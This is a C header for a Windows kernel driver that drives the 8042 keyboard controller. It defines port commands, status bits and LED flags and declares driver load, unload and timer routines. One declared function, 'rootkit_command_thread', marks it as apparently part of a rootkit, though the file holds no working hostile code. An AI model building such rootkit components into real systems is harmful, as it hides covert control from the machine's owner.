#ifndef _BASIC_HARDWARE_H
#define _BASIC_HARDWARE_H

#include "kernellib.h"

HANDLE gWorkerThread;
PKTIMER	gTimer;
PKDPC	gDPCP;

// commands
#define READ_CONTROLLER		0x20
#define WRITE_CONTROLLER	0x60

// command bytes
#define SET_LEDS			0xED
#define KEY_RESET			0xFF

// responses from keyboard
#define KEY_ACK				0xFA	// ack
#define KEY_AGAIN			0xFE	// send again

// 8042 ports
// when you read from port 64, this is called STATUS_BYTE
// when you write to port 64, this is called COMMAND_BYTE
// read and write on port 64 is called DATA_BYTE 

// status register bits
#define IBUFFER_FULL		0x02
#define OBUFFER_FULL		0x01

// flags for keyboard LEDS
#define SCROLL_LOCK_BIT		(0x01 << 0)
#define NUMLOCK_BIT			(0x01 << 1)
#define CAPS_LOCK_BIT		(0x01 << 2)

VOID rootkit_command_thread(PVOID context);
ULONG WaitForKeyboard();
VOID DrainOutputBuffer();
ULONG SendKeyboardCommand(IN UCHAR theCommand);
VOID SetLEDS(UCHAR theLEDS);
VOID timerDPC(IN PKDPC Dpc,
	IN PVOID DeferredContext,
	IN PVOID sys1,
	IN PVOID sys2);

NTSTATUS BH_Onload(IN PDRIVER_OBJECT theDriverObject,
	IN PUNICODE_STRING theRegistryPath);
VOID BH_OnUnload(IN PDRIVER_OBJECT DriverObject);

#endif